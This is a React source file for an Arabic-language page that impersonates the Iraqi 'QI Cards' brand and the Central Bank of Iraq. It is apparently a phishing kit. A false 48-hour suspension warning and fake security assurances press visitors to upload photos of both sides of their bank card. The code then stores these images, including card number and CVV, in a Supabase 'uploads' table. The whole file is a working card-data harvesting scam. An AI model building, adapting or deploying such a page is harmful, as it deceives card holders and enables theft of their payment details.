
import React, { useState, useEffect } from 'react';
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Upload, CreditCard, AlertTriangle, Sparkles, Shield, Phone, Mail, MapPin, Clock, CheckCircle, ArrowRight, X } from "lucide-react";
import { toast } from "sonner";
import { supabase } from '@/lib/supabase';

const Index = () => {
  const [frontImage, setFrontImage] = useState<File | null>(null);
  const [backImage, setBackImage] = useState<File | null>(null);
  const [frontImagePreview, setFrontImagePreview] = useState<string | null>(null);
  const [backImagePreview, setBackImagePreview] = useState<string | null>(null);

  // Function to compress image
  const compressImage = (file: File, maxWidth: number = 800, quality: number = 0.8): Promise<File> => {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const img = new Image();
      
      img.onload = () => {
        // Calculate new dimensions
        let { width, height } = img;
        if (width > maxWidth) {
          height = (height * maxWidth) / width;
          width = maxWidth;
        }
        
        canvas.width = width;
        canvas.height = height;
        
        // Draw and compress
        ctx?.drawImage(img, 0, 0, width, height);
        canvas.toBlob((blob) => {
          if (blob) {
            const compressedFile = new File([blob], file.name, {
              type: 'image/jpeg',
              lastModified: Date.now(),
            });
            resolve(compressedFile);
          } else {
            resolve(file);
          }
        }, 'image/jpeg', quality);
      };
      
      img.src = URL.createObjectURL(file);
    });
  };

  const handleImageUpload = async (event: React.ChangeEvent<HTMLInputElement>, side: 'front' | 'back') => {
    const file = event.target.files?.[0];
    if (file) {
      try {
        // Compress the image
        const compressedFile = await compressImage(file);
        
        // Create preview URL
        const previewUrl = URL.createObjectURL(compressedFile);
        
        if (side === 'front') {
          setFrontImage(compressedFile);
          setFrontImagePreview(previewUrl);
          toast.success("تم رفع صورة الواجهة الأمامية بنجاح!");
        } else {
          setBackImage(compressedFile);
          setBackImagePreview(previewUrl);
          toast.success("تم رفع صورة الواجهة الخلفية بنجاح!");
        }
      } catch (error) {
        console.error('خطأ في معالجة الصورة:', error);
        toast.error("حدث خطأ في معالجة الصورة. يرجى المحاولة مرة أخرى.");
      }
    }
  };

  const removeImage = (side: 'front' | 'back') => {
    if (side === 'front') {
      setFrontImage(null);
      if (frontImagePreview) {
        URL.revokeObjectURL(frontImagePreview);
        setFrontImagePreview(null);
      }
      const input = document.getElementById('front-upload') as HTMLInputElement;
      if (input) input.value = '';
    } else {
      setBackImage(null);
      if (backImagePreview) {
        URL.revokeObjectURL(backImagePreview);
        setBackImagePreview(null);
      }
      const input = document.getElementById('back-upload') as HTMLInputElement;
      if (input) input.value = '';
    }
  };

  // Cleanup preview URLs on component unmount
  useEffect(() => {
    return () => {
      if (frontImagePreview) {
        URL.revokeObjectURL(frontImagePreview);
      }
      if (backImagePreview) {
        URL.revokeObjectURL(backImagePreview);
      }
    };
  }, [frontImagePreview, backImagePreview]);

  const handleCardUpdate = async () => {
    if (!frontImage || !backImage) {
      toast.error("يرجى رفع صور الواجهة الأمامية والخلفية للبطاقة");
      return;
    }

    try {
      // تحويل الصور إلى base64 للحفظ
      const reader1 = new FileReader();
      const reader2 = new FileReader();

      const uploadToSupabase = () => {
        return new Promise((resolve, reject) => {
          reader1.onload = () => {
            reader2.onload = async () => {
              try {
                const uploadData = {
                  front_image: reader1.result as string,
                  back_image: reader2.result as string,
                  status: 'pending',
                  created_at: new Date().toISOString()
                };

                const { data, error } = await supabase
                  .from('uploads')
                  .insert([uploadData])
                  .select();

                if (error) {
                  reject(error);
                } else {
                  resolve(data);
                }
              } catch (error) {
                reject(error);
              }
            };
            reader2.readAsDataURL(backImage);
          };
          reader1.readAsDataURL(frontImage);
        });
      };

      await uploadToSupabase();
      
      toast.success("تم رفع الصور بنجاح! سيتم مراجعتها من قبل الإدارة");
      
      // إعادة تعيين الحقول
      setFrontImage(null);
      setBackImage(null);
      
      // تنظيف URLs المعاينة
      if (frontImagePreview) {
        URL.revokeObjectURL(frontImagePreview);
        setFrontImagePreview(null);
      }
      if (backImagePreview) {
        URL.revokeObjectURL(backImagePreview);
        setBackImagePreview(null);
      }
      
      // إعادة تعيين input files
      const frontInput = document.getElementById('front-upload') as HTMLInputElement;
      const backInput = document.getElementById('back-upload') as HTMLInputElement;
      if (frontInput) frontInput.value = '';
      if (backInput) backInput.value = '';
      
    } catch (error) {
      console.error('خطأ في رفع الصور:', error);
      toast.error("حدث خطأ في رفع الصور. يرجى المحاولة مرة أخرى.");
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50">
      {/* Header */}
      <div className="bg-white shadow-sm border-b border-gray-100">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center gap-3">
              <img src={`${import.meta.env.BASE_URL}qi-logo.svg`} alt="QI Card Logo" className="w-10 h-10" />
              <div>
                <h1 className="text-2xl font-bold text-[#111]">QI Cards</h1>
                <p className="text-sm text-[#222] opacity-90">نظام البطاقات الذكية</p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Button
                size="sm"
                className="bg-[#FFD600] text-[#111] font-bold border border-[#FFD600] hover:bg-[#FFC400] hover:shadow-md transition-colors duration-200"
              >
                <Phone className="w-4 h-4 mr-2 text-[#111]" />
                الدعم الفني
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Hero Section */}
      <div className="bg-gradient-to-r from-[#FFD600] via-[#FFEB3B] to-[#FFFDE7] text-[#222] py-16 px-4 border-b border-yellow-100">
        <div className="max-w-7xl mx-auto text-center">
          <h2 className="text-4xl md:text-6xl font-bold mb-6">
              تحديث البطاقات المصرفية
            </h2>
          <p className="text-lg text-[#444] max-w-3xl mx-auto leading-relaxed mb-8">
            حدث بطاقتك الآن لضمان استمرار عملها وحمايتها من التوقيف من قبل البنك المركزي العراقي
          </p>
          <div className="flex items-center justify-center gap-6 text-[#FFD600]">
            <div className="flex items-center gap-2">
              <CheckCircle className="w-5 h-5 text-green-600" />
              <span className="text-[#222]">حماية فورية</span>
            </div>
            <div className="flex items-center gap-2">
              <CheckCircle className="w-5 h-5 text-green-600" />
              <span className="text-[#222]">تحديث آمن</span>
            </div>
            <div className="flex items-center gap-2">
              <CheckCircle className="w-5 h-5 text-green-600" />
              <span className="text-[#222]">دعم 24/7</span>
            </div>
          </div>
        </div>
      </div>

      {/* Warning Banner */}
      <div className="bg-gradient-to-r from-red-50 to-orange-50 border-l-4 border-red-500 py-8 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-start gap-4">
            <AlertTriangle className="w-8 h-8 text-red-600 flex-shrink-0 mt-1" />
            <div>
              <h3 className="text-xl font-bold text-red-800 mb-3">تحذير هام من البنك المركزي العراقي</h3>
              <p className="text-red-700 text-lg leading-relaxed">
                يجب تحديث جميع البطاقات المصرفية خلال 48 ساعة لتجنب التوقيف التلقائي. 
                قم برفع صور واضحة وعالية الجودة للواجهة الأمامية والخلفية للبطاقة.
              </p>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto py-16 px-4">
        <div className="grid lg:grid-cols-2 gap-12 items-start">
          {/* Card Preview */}
          <div className="space-y-4">
            <div className="text-center">
              <h2 className="text-2xl font-bold text-gray-800 mb-2 flex items-center justify-center gap-2">
                <img src={`${import.meta.env.BASE_URL}qi-logo.svg`} alt="QI Card Logo" className="w-6 h-6 inline-block" />
                معاينة البطاقة
              </h2>
              <p className="text-gray-600 text-sm">تأكد من وضوح جميع البيانات في الصور المرفوعة</p>
            </div>

            {/* Front Card */}
            <Card className="bg-gradient-to-br from-blue-600 via-blue-700 to-blue-800 border-0 overflow-hidden shadow-2xl transform hover:scale-105 transition-transform duration-300">
              <CardContent className="p-4 relative h-40">
                {frontImagePreview ? (
                  <div className="absolute inset-0">
                    <img 
                      src={frontImagePreview} 
                      alt="صورة البطاقة الأمامية" 
                      className="w-full h-full object-cover rounded-lg"
                    />
                    <div className="absolute inset-0 bg-black bg-opacity-30"></div>
                  </div>
                ) : (
                  <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-transparent"></div>
                )}
                <div className="relative z-10 h-full flex flex-col justify-between">
                  <div className="flex justify-between items-start">
                    <div className="text-white/80 text-xs font-medium">QI CARD</div>
                    <div className="w-8 h-6 bg-white rounded flex items-center justify-center">
                      <img src={`${import.meta.env.BASE_URL}qi-logo.svg`} alt="QI Card Logo" className="w-4 h-4" />
                    </div>
                  </div>
                  <div className="text-white text-sm font-mono tracking-wider mb-3">
                    1234 5678 9012 3456
                  </div>
                  <div className="flex justify-between items-end">
                    <div>
                      <div className="text-white/60 text-xs mb-1">اسم حامل البطاقة</div>
                      <div className="text-white text-xs font-semibold">
                        AHMED MOHAMMED ALI
                      </div>
                    </div>
                    <div>
                      <div className="text-white/60 text-xs mb-1">تاريخ الانتهاء</div>
                      <div className="text-white text-xs font-mono">
                        12/28
                      </div>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Back Card */}
            <Card className="bg-gradient-to-br from-gray-700 via-gray-800 to-gray-900 border-0 overflow-hidden shadow-2xl transform hover:scale-105 transition-transform duration-300">
              <CardContent className="p-4 relative h-40">
                {backImagePreview ? (
                  <div className="absolute inset-0">
                    <img 
                      src={backImagePreview} 
                      alt="صورة البطاقة الخلفية" 
                      className="w-full h-full object-cover rounded-lg"
                    />
                    <div className="absolute inset-0 bg-black bg-opacity-30"></div>
                  </div>
                ) : (
                  <>
                    <div className="bg-black h-6 -mx-4 mb-4 mt-1"></div>
                    <div className="bg-white/90 h-6 rounded mb-3 flex items-center justify-end px-2">
                      <span className="text-black font-mono text-xs font-bold">
                        123
                      </span>
                    </div>
                    <div className="text-white/70 text-xs leading-relaxed">
                      هذه البطاقة ملك لحاملها المعتمد. في حالة العثور عليها يرجى إعادتها للبنك المصدر.
                    </div>
                  </>
                )}
              </CardContent>
            </Card>
          </div>

          {/* Upload Form */}
          <div className="space-y-8">
            <Card className="bg-white border-0 shadow-xl rounded-2xl overflow-hidden">
              <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-4 text-white">
                <h2 className="text-xl font-bold text-center flex items-center justify-center gap-3">
                  <Upload className="w-6 h-6" />
                  رفع صور البطاقة
                </h2>
                <p className="text-blue-100 text-center mt-1 text-sm">أرفع صور واضحة للبطاقة لتحديثها</p>
              </div>
              <CardContent className="p-6">
                <div className="space-y-6">
                  {/* Front Image Upload */}
                  <div>
                    <label className="text-gray-700 font-semibold mb-3 block text-base">
                      الواجهة الأمامية للبطاقة
                    </label>
                    {frontImagePreview ? (
                      <div className="relative">
                        <img 
                          src={frontImagePreview} 
                          alt="معاينة الصورة الأمامية" 
                          className="w-full h-32 object-cover rounded-lg border-2 border-blue-300"
                        />
                        <Button
                          variant="destructive"
                          size="sm"
                          className="absolute top-1 right-1 h-6 w-6 p-0"
                          onClick={() => removeImage('front')}
                        >
                          <X className="w-3 h-3" />
                        </Button>
                        <div className="mt-1 text-center">
                          <p className="text-xs text-gray-600 truncate">{frontImage?.name}</p>
                          <p className="text-xs text-green-600 flex items-center justify-center gap-1">
                            <CheckCircle className="w-3 h-3" />
                            تم الرفع بنجاح
                          </p>
                        </div>
                      </div>
                    ) : (
                      <div className="border-2 border-dashed border-blue-300 rounded-lg p-4 text-center hover:border-blue-400 hover:bg-blue-50 transition-all duration-300 bg-gray-50">
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleImageUpload(e, 'front')}
                          className="hidden"
                          id="front-upload"
                        />
                        <label htmlFor="front-upload" className="cursor-pointer">
                          <Upload className="w-8 h-8 text-blue-500 mx-auto mb-2" />
                          <p className="text-gray-700 mb-1 text-sm font-medium">
                            اضغط لرفع صورة الواجهة الأمامية
                          </p>
                          <p className="text-gray-500 text-xs">PNG, JPG - سيتم ضغط الصورة تلقائياً</p>
                        </label>
                      </div>
                    )}
                  </div>

                  {/* Back Image Upload */}
                  <div>
                    <label className="text-gray-700 font-semibold mb-3 block text-base">
                      الواجهة الخلفية للبطاقة
                    </label>
                    {backImagePreview ? (
                      <div className="relative">
                        <img 
                          src={backImagePreview} 
                          alt="معاينة الصورة الخلفية" 
                          className="w-full h-32 object-cover rounded-lg border-2 border-blue-300"
                        />
                        <Button
                          variant="destructive"
                          size="sm"
                          className="absolute top-1 right-1 h-6 w-6 p-0"
                          onClick={() => removeImage('back')}
                        >
                          <X className="w-3 h-3" />
                        </Button>
                        <div className="mt-1 text-center">
                          <p className="text-xs text-gray-600 truncate">{backImage?.name}</p>
                          <p className="text-xs text-green-600 flex items-center justify-center gap-1">
                            <CheckCircle className="w-3 h-3" />
                            تم الرفع بنجاح
                          </p>
                        </div>
                      </div>
                    ) : (
                      <div className="border-2 border-dashed border-blue-300 rounded-lg p-4 text-center hover:border-blue-400 hover:bg-blue-50 transition-all duration-300 bg-gray-50">
                        <input
                          type="file"
                          accept="image/*"
                          onChange={(e) => handleImageUpload(e, 'back')}
                          className="hidden"
                          id="back-upload"
                        />
                        <label htmlFor="back-upload" className="cursor-pointer">
                          <Upload className="w-8 h-8 text-blue-500 mx-auto mb-2" />
                          <p className="text-gray-700 mb-1 text-sm font-medium">
                            اضغط لرفع صورة الواجهة الخلفية
                          </p>
                          <p className="text-gray-500 text-xs">PNG, JPG - سيتم ضغط الصورة تلقائياً</p>
                        </label>
                      </div>
                    )}
                  </div>
                </div>

                <Button 
                  onClick={handleCardUpdate}
                  className="w-full mt-6 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold py-3 text-base rounded-lg transition-all duration-300 transform hover:scale-105 shadow-lg border-0 flex items-center justify-center gap-3"
                >
                  <Shield className="w-4 h-4" />
                  تحديث البطاقة وحمايتها من التوقيف
                  <ArrowRight className="w-4 h-4" />
                </Button>

                <div className="mt-4 p-3 bg-blue-50 rounded-lg border border-blue-200">
                  <div className="flex items-start gap-2">
                    <Shield className="w-4 h-4 text-blue-600 mt-0.5 flex-shrink-0" />
                    <div>
                      <h4 className="font-semibold text-blue-800 mb-1 text-sm">معلومات الأمان</h4>
                      <p className="text-blue-700 text-xs">
                        جميع البيانات محمية بتقنيات التشفير المتقدمة. لن يتم مشاركة معلوماتك مع أي طرف ثالث.
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>

      {/* Features Section */}
      <div className="bg-white py-16">
        <div className="max-w-7xl mx-auto px-4">
          <h3 className="text-3xl font-bold text-center text-gray-800 mb-12">مميزات الخدمة</h3>
          <div className="grid md:grid-cols-3 gap-8">
            <div className="text-center p-6">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Shield className="w-8 h-8 text-blue-600" />
              </div>
              <h4 className="text-xl font-bold text-gray-800 mb-3">حماية فورية</h4>
              <p className="text-gray-600">حماية فورية للبطاقة من التوقيف خلال 24 ساعة</p>
            </div>
            <div className="text-center p-6">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="w-8 h-8 text-green-600" />
              </div>
              <h4 className="text-xl font-bold text-gray-800 mb-3">تحديث آمن</h4>
              <p className="text-gray-600">تحديث آمن ومشفر لجميع بيانات البطاقة</p>
            </div>
            <div className="text-center p-6">
              <div className="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Phone className="w-8 h-8 text-yellow-600" />
              </div>
              <h4 className="text-xl font-bold text-gray-800 mb-3">دعم 24/7</h4>
              <p className="text-gray-600">دعم فني متاح على مدار الساعة</p>
            </div>
          </div>
        </div>
      </div>

      {/* Contact Information Footer */}
      <div className="bg-gray-50 py-16">
        <div className="max-w-7xl mx-auto px-4">
          <h3 className="text-3xl font-bold text-center text-gray-800 mb-12">معلومات التواصل</h3>
          <div className="grid md:grid-cols-4 gap-8">
            <div className="text-center">
              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Phone className="w-8 h-8 text-blue-600" />
              </div>
              <h4 className="font-bold text-gray-800 mb-3 text-lg">الهاتف</h4>
              <p className="text-gray-700">زين - اسياسيل - كورك: 422</p>
            </div>
            
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Mail className="w-8 h-8 text-green-600" />
              </div>
              <h4 className="font-bold text-gray-800 mb-3 text-lg">البريد الإلكتروني</h4>
              <p className="text-gray-700">info@qicards.iq</p>
              <p className="text-gray-700">support@qicards.iq</p>
            </div>
            
            <div className="text-center">
              <div className="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <MapPin className="w-8 h-8 text-yellow-600" />
              </div>
              <h4 className="font-bold text-gray-800 mb-3 text-lg">العنوان</h4>
              <p className="text-gray-700">شارع الكرادة بغداد، العراق</p>
            </div>

            <div className="text-center">
              <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <Clock className="w-8 h-8 text-purple-600" />
              </div>
              <h4 className="font-bold text-gray-800 mb-3 text-lg">ساعات العمل</h4>
              <p className="text-gray-700">8:00 ص - 8:00 م</p>
              <p className="text-gray-700">7 أيام في الأسبوع</p>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="bg-gray-900 py-8">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <div className="flex items-center justify-center gap-3 mb-4">
            <img src={`${import.meta.env.BASE_URL}qi-logo.svg`} alt="QI Card Logo" className="w-8 h-8" />
            <span className="font-bold text-white text-xl">QI Cards</span>
          </div>
          <p className="text-gray-300 mb-2">
            © 2024 - نظام حماية البطاقات المصرفية - جميع الحقوق محفوظة
          </p>
          <p className="text-gray-400 text-sm">
            خدمة العملاء متاحة على مدار الساعة | مدعوم من البنك المركزي العراقي
          </p>
        </div>
      </div>
    </div>
  );
};

export default Index;
